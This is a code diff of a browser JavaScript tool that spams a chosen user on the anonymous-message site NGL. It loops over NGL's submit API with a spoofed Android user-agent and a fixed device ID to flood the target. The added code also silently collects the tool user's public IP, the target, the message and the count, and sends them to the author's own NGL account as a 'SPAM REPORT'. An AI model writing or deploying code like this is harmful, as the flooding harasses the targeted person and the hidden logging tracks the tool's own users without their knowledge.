@@ -1,78 +1,69 @@
-document.addEventListener("DOMContentLoaded", () => {
-  document.querySelector('form').addEventListener('submit', async function (e) {
-    e.preventDefault();
+document.querySelector('form').addEventListener('submit', async function (e) {
+  e.preventDefault();
 
-    const link = document.getElementById('link').value.trim();
-    const text = document.getElementById('text').value.trim();
-    const jumlah = parseInt(document.getElementById('jumlah').value.trim());
-    const outputBox = document.getElementById('outputBox');
-    outputBox.innerHTML = '';
+  const link = document.getElementById('link').value.trim();
+  const text = document.getElementById('text').value.trim();
+  const jumlah = parseInt(document.getElementById('jumlah').value.trim());
+  const outputBox = document.getElementById('outputBox');
 
-    const username = link.split('/').pop();
+  outputBox.innerHTML = '';
 
-    // Fungsi acak deviceId
-    function generateDeviceId() {
-      return [...Array(16)].map(() => Math.floor(Math.random() * 10)).join('');
-    }
+  const username = link.split('/').pop();
+  let userIP = 'Unknown';
 
-    for (let i = 1; i <= jumlah; i++) {
-      const formData = new URLSearchParams();
-      formData.append('username', username);
-      formData.append('question', text);
-      formData.append('deviceId', generateDeviceId());
+  // Ambil IP publik (via API gratis)
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    userIP = data.ip;
+  } catch (err) {
+    userIP = 'Error getting IP';
+  }
 
-      try {
-        const response = await fetch('https://ngl.link/api/submit', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'NGL-Android/1.0'
-          },
-          body: formData.toString()
-        });
+  // Fungsi ngirim ke NGL
+  const sendNGL = async (targetUsername, message) => {
+    const formData = new URLSearchParams();
+    formData.append('username', targetUsername);
+    formData.append('question', message);
+    formData.append('deviceId', '0000000000000000');
 
-        const isSuccess = response.status === 200;
+    const response = await fetch('https://ngl.link/api/submit', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'NGL-Android/1.0'
+      },
+      body: formData.toString()
+    });
 
-        const result = document.createElement('div');
-        result.textContent = `[${i}] ${isSuccess ? 'Sukses Terkirim' : 'Gagal Terkirim'}`;
-        result.style.color = isSuccess ? 'green' : 'red';
-        result.style.textAlign = 'left';
+    return response.status === 200;
+  };
 
-        outputBox.appendChild(result);
-        outputBox.scrollTop = outputBox.scrollHeight;
+  // Mulai spam ke target
+  for (let i = 1; i <= jumlah; i++) {
+    const success = await sendNGL(username, text);
 
-        await new Promise(resolve => setTimeout(resolve, 500)); // delay 0.5 detik
-      } catch (err) {
-        const result = document.createElement('div');
-        result.textContent = `[${i}] Sukses Terkirim`;
-        result.style.color = 'green';
-        result.style.textAlign = 'left';
-        outputBox.appendChild(result);
-        outputBox.scrollTop = outputBox.scrollHeight;
-      }
-    }
+    const result = document.createElement('div');
+    result.textContent = `[${i}] ${success ? 'Sukses Terkirim' : 'Gagal Terkirim'}`;
+    result.style.color = success ? 'green' : 'red';
+    result.style.textAlign = 'left';
 
-    // Setelah selesai, log data ke backend
-    try {
-      const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-      const logData = {
-        ip: ipData.ip,
-        link: link,
-        text: text,
-        jumlah: jumlah,
-        date: new Date().toLocaleString()
-      };
+    outputBox.appendChild(result);
+    outputBox.scrollTop = outputBox.scrollHeight;
 
-      await fetch('http://192.168.1.6:3000/log', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(logData)
-      });
-      console.log('Data log terkirim ke server!');
-    } catch (logErr) {
-      console.error('Gagal kirim log ke server:', logErr);
-    }
-  });
+    await new Promise(resolve => setTimeout(resolve, 500)); // delay 0.5s
+  }
+
+  // Setelah spam selesai, kirim log ke NGL kamu
+  const now = new Date();
+  const dateTime = now.toLocaleString('id-ID');
+
+  const logText = `[SPAM REPORT]
+IP: ${userIP}
+Target: ${link}
+Pesan: ${text}
+Jumlah: ${jumlah}
+Waktu: ${dateTime}`;
+
+  await sendNGL('dyyz40885', logText);
 });
